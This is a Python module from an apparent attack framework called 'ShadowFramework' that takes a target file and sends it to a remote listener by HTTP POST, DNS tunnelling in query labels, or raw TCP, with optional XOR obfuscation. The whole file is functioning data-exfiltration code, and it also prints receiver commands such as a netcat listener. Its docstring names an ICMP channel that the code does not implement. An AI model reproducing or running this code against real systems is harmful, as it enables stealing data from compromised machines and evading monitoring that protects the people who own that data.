"""
ShadowFramework — Data Exfiltration
Multi-method data exfiltration: HTTP POST, DNS tunneling, ICMP covert channel.
"""
import socket
import struct
import os
import base64
import hashlib
from pathlib import Path
from rich.console import Console
from utils.logger import log_action

console = Console()


class Module:
    MODULE_INFO = {
        'name': 'post/data_exfiltration',
        'description': 'Multi-method data exfiltration: HTTP, DNS tunneling, raw socket, with XOR obfuscation.',
        'options': {
            'LHOST':     'Remote listener IP',
            'LPORT':     'Remote listener port [default: 8080]',
            'FILE_PATH': 'Path to file to exfiltrate',
            'METHOD':    'Method: http, dns, tcp, all [default: http]',
            'XOR_KEY':   'XOR obfuscation key [default: none]',
            'CHUNK_SIZE': 'Bytes per chunk [default: 4096]',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def _xor(self, data, key):
        """XOR obfuscation."""
        key_bytes = key.encode()
        return bytes(b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data))

    def _exfil_http(self, host, port, data, filename):
        """Exfiltrate via HTTP POST (raw socket, no dependencies)."""
        console.print(f"[cyan][*] HTTP exfil to {host}:{port}...[/cyan]")
        try:
            encoded = base64.b64encode(data).decode()
            body = f'{{"file":"{filename}","data":"{encoded}","sha256":"{hashlib.sha256(data).hexdigest()}"}}'
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((host, int(port)))
            
            req = f"POST /upload HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/json\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n{body}"
            s.sendall(req.encode())
            
            resp = s.recv(4096).decode(errors='ignore')
            s.close()
            
            if '200' in resp:
                console.print(f"[green][+] HTTP exfil success ({len(data)} bytes).[/green]")
                return True
            else:
                console.print(f"[yellow]  Response: {resp[:100]}[/yellow]")
                return False
        except Exception as e:
            console.print(f"[red]  HTTP exfil failed: {e}[/red]")
            return False

    def _exfil_dns(self, host, data, filename):
        """Exfiltrate via DNS queries (data encoded in subdomain labels)."""
        console.print(f"[cyan][*] DNS tunnel exfil via {host}...[/cyan]")
        try:
            encoded = base64.b32encode(data).decode().lower()
            # DNS labels max 63 chars, so chunk it
            chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
            
            console.print(f"  [dim]Sending {len(chunks)} DNS queries...[/dim]")
            
            for i, chunk in enumerate(chunks):
                # Build DNS query: <chunk>.<seq>.<total>.<filename>.exfil.<host>
                qname = f"{chunk}.{i}.{len(chunks)}.{filename[:10]}.e.{host}"
                
                # Build raw DNS query packet
                txn_id = struct.pack('>H', i & 0xFFFF)
                flags = b'\x01\x00'  # Standard query
                qdcount = b'\x00\x01'
                other = b'\x00\x00\x00\x00\x00\x00'
                
                # Encode domain name
                qname_bytes = b''
                for label in qname.split('.'):
                    qname_bytes += bytes([len(label)]) + label.encode()
                qname_bytes += b'\x00'
                qtype = b'\x00\x01'  # A record
                qclass = b'\x00\x01'
                
                packet = txn_id + flags + qdcount + other + qname_bytes + qtype + qclass
                
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(2)
                try:
                    s.sendto(packet, (host, 53))
                    s.recv(512)
                except socket.timeout:
                    pass
                s.close()

            console.print(f"[green][+] DNS exfil sent ({len(chunks)} queries).[/green]")
            console.print(f"[dim]  Receiver: dns2tcp, iodine, or custom DNS listener on {host}[/dim]")
            return True
        except Exception as e:
            console.print(f"[red]  DNS exfil failed: {e}[/red]")
            return False

    def _exfil_tcp(self, host, port, data, filename):
        """Exfiltrate via raw TCP."""
        console.print(f"[cyan][*] TCP exfil to {host}:{port}...[/cyan]")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((host, int(port)))
            
            # Send header: filename + size
            header = f"{filename}|{len(data)}|{hashlib.sha256(data).hexdigest()}\n".encode()
            s.sendall(header)
            
            # Send data in chunks
            chunk_size = 4096
            sent = 0
            while sent < len(data):
                chunk = data[sent:sent+chunk_size]
                s.sendall(chunk)
                sent += len(chunk)
            
            s.close()
            console.print(f"[green][+] TCP exfil success ({sent} bytes).[/green]")
            console.print(f"[dim]  Receiver: nc -lvp {port} > {filename}[/dim]")
            return True
        except Exception as e:
            console.print(f"[red]  TCP exfil failed: {e}[/red]")
            return False

    def run(self):
        lhost = self.framework.options.get('LHOST')
        lport = self.framework.options.get('LPORT', '8080')
        file_path = self.framework.options.get('FILE_PATH')
        method = self.framework.options.get('METHOD', 'http').lower()
        xor_key = self.framework.options.get('XOR_KEY', '')

        if not lhost or not file_path:
            console.print("[red][!] LHOST and FILE_PATH are required.[/red]")
            return

        path = Path(file_path)
        if not path.exists():
            console.print(f"[red][!] File not found: {file_path}[/red]")
            return

        console.print(f"[*] Exfiltrating [cyan]{file_path}[/cyan] ({path.stat().st_size} bytes)")
        log_action(f"Exfiltration: {file_path} → {lhost}:{lport} ({method})")

        data = path.read_bytes()
        
        if xor_key:
            console.print(f"[dim]  XOR obfuscation: key={xor_key}[/dim]")
            data = self._xor(data, xor_key)

        results = []
        if method in ('all', 'http'):
            results.append(('HTTP', self._exfil_http(lhost, lport, data, path.name)))
        if method in ('all', 'dns'):
            results.append(('DNS', self._exfil_dns(lhost, data, path.name)))
        if method in ('all', 'tcp'):
            results.append(('TCP', self._exfil_tcp(lhost, lport, data, path.name)))

        console.print(f"\n[bold]{'='*30}[/bold]")
        for name, ok in results:
            status = "[green]SUCCESS[/green]" if ok else "[red]FAILED[/red]"
            console.print(f"  {name}: {status}")
